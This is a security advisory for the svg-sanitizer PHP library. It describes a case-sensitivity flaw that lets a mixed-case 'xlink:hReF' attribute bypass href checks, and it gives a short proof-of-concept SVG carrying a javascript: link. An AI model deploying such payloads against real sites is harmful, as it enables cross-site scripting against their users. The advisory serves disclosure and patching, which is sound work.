# [M] svg-sanitizer Bypasses Attribute Sanitization

## Summary
Severity: Medium
Advisory: GHSA-22wq-q86m-83fh
CVE: CVE-2025-55166
CWE: CWE-601, CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-08-12
Source: https://github.com/advisories/GHSA-22wq-q86m-83fh
Type: github-advisory

## Affected
- Packagist: `enshrined/svg-sanitize` — affected >=0 <0.22.0

## Details
#### Problem

The sanitization logic at https://github.com/darylldoyle/svg-sanitizer/blob/0.21.0/src/Sanitizer.php#L454-L481 only searches for lower-case attribute names (e.g. `xlink:href` instead of `xlink:HrEf`), which allows to by-pass the `isHrefSafeValue` check. As a result this allows cross-site scripting or linking to external domains.

#### Proof-of-concept
_provided by azizk_

```
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <a xlink:hReF="javascript:alert(document.domain)">
    <rect width="100" height="50" fill="red"></rect>
    <text x="50" y="30" text-anchor="middle" fill="white">Click me</text>
  </a>
</svg>
```

#### Credits

The mentioned findings and proof-of-concept example were reported to the TYPO3 Security Team by the external security researcher `azizk <medazizknani@gmail.com>`.

## References
- https://github.com/darylldoyle/svg-sanitizer/security/advisories/GHSA-22wq-q86m-83fh
- https://nvd.nist.gov/vuln/detail/CVE-2025-55166
- https://github.com/darylldoyle/svg-sanitizer/commit/0afa95ea74be155a7bcd6c6fb60c276c39984500
- https://github.com/darylldoyle/svg-sanitizer/commit/5a0a1eaf0c6b0b540dc945fe30c93cf106b357c1
- https://github.com/darylldoyle/svg-sanitizer
- https://github.com/darylldoyle/svg-sanitizer/blob/0.21.0/src/Sanitizer.php#L454-L481
- https://github.com/darylldoyle/svg-sanitizer/releases/tag/0.22.0
